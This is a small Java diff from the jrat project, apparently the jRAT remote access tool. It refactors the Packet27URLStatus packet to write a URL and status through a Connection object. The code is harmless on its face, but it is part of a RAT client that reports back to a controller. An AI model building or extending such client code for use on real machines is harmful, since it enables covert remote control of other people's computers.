@@ -1,7 +1,6 @@
 package jrat.client.packets.outgoing;
 
-import jrat.common.io.StringWriter;
-import java.io.DataOutputStream;
+import jrat.client.Connection;
 
 
 public class Packet27URLStatus extends AbstractOutgoingPacket {
@@ -15,9 +14,9 @@ public class Packet27URLStatus extends AbstractOutgoingPacket {
 	}
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		sw.writeLine(url);
-		sw.writeLine(status);
+	public void write(Connection con) throws Exception {
+        con.writeLine(url);
+        con.writeLine(status);
 	}
 
 	@Override
